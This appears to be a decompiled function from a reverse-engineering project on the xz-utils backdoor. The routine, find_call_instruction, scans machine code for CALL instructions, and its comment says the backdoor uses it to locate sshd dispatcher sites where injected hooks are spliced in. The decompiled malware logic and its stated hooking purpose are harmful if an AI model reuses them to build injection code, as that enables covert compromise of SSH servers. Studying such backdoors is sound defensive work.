// /home/kali/xzre-ghidra/xzregh/100C90_find_call_instruction.c
// Function: find_call_instruction @ 0x100C90
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_call_instruction(u8 * code_start, u8 * code_end, u8 * call_target, dasm_ctx_t * dctx)


/*
 * AutoDoc: Disassembles forward until it encounters a CALL opcode and reports both the instruction and target. The hook finder uses it to locate indirect dispatcher sites in sshd so the injected shims can be spliced in safely.
 */
#include "xzre_types.h"


BOOL find_call_instruction(u8 *code_start,u8 *code_end,u8 *call_target,dasm_ctx_t *dctx)

{
  int iVar1;
  BOOL BVar2;
  long lVar3;
  dasm_ctx_t *pdVar4;
  byte bVar5;
  dasm_ctx_t ctx;
  dasm_ctx_t local_80;
  
  bVar5 = 0;
  BVar2 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x81,4,7);
  if (BVar2 != FALSE) {
    pdVar4 = &local_80;
    for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
      *(undefined4 *)&pdVar4->instruction = 0;
      pdVar4 = (dasm_ctx_t *)((long)pdVar4 + ((ulong)bVar5 * -2 + 1) * 4);
    }
    if (dctx == (dasm_ctx_t *)0x0) {
      dctx = &local_80;
    }
    while (code_start < code_end) {
      BVar2 = x86_dasm(dctx,code_start,code_end);
      if (BVar2 == FALSE) {
        code_start = code_start + 1;
      }
      else {
        iVar1._0_1_ = dctx->_unknown810[0];
        iVar1._1_1_ = dctx->_unknown810[1];
        iVar1._2_1_ = dctx->_unknown810[2];
        iVar1._3_1_ = dctx->field_0x2b;
        if ((iVar1 == 0x168) &&
           ((call_target == (u8 *)0x0 ||
            (dctx->instruction + dctx->instruction_size + dctx->mem_disp == call_target)))) {
          return TRUE;
        }
        code_start = code_start + dctx->instruction_size;
      }
    }
  }
  return FALSE;
}

